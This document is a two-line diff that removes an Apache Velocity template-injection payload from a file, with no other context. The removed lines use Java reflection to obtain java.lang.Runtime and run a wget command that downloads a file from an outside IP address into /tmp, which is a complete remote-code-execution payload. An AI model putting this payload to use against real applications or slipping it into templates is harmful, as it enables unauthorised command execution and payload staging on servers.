@@ -1,2 +1,0 @@
-#set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("wget http://192.168.11.122/asd.txt -O /tmp/asd.txt").waitFor()
